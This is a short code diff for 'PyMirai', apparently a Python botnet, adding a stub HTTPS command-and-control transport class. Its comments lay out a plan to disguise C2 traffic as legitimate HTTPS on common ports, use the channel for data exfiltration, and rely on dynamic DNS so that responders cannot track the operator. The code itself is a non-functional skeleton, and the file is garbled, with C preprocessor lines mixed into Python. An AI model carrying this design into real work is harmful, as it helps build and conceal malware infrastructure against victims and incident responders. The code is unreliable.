@@ -1,4 +1,4 @@
-import os, dns, socket, operator, sys
+import os, dns, socket, operator, sys, httplib, ssl
 from dns import *
 #pragma once
 
@@ -6,6 +6,21 @@ from dns import *
 #include <stdint.h>domain, nslist=
 #include <stdarg.h>
 
+# consider changing C2 traffic from basic TCP handshakes to HTTPS with SSL
+# HTTPS is widely supported among all OSes and IoT devices
+# combined with SSL, the traffic is difficult to distinguish from legitimate traffic
+# Can be used for exfil purposes, a manual option for the operator of the C2, it's faster than DNS tunneling
+# proposed ports to be used, 80, 8080, 8081, 443, 8443
+# if SSL handshake fails, resort to cleartext HTTP but always attempt to renegotiate SSL session periodically (every 10 minutes)
+class https_transport(object):
+	def __init__(self, domain, port, keyfile):
+		self.domain = domain
+		self.port = port
+		self.keyfile = keyfile
+	def c2_request(domain, port):
+		return session
+	def ssl_negotiation(domain, keyfile):
+		return
 # instead of static ipv4 addresses in public namespace, from now on, PyMirai will instead be designed to resolve dynamic DNS addresses provided by dyndns or similar services
 # that means your IP address can change but the DNS system will always point to your C2
 # creates a moving target making it harder for responders to track you.
